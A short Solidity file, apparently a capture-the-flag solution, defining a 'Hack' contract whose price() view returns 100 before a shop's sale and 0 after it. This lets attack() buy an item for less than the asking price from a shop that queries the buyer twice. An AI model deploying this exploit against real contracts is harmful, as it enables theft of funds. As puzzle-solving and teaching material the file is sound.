// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract Hack {
    IShop shop;

    constructor(address contractAddress) {
        shop = IShop(contractAddress);
    }

    function attack() public {
        shop.buy();
    }

    function price() public view returns (uint) {
        if (shop.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }
}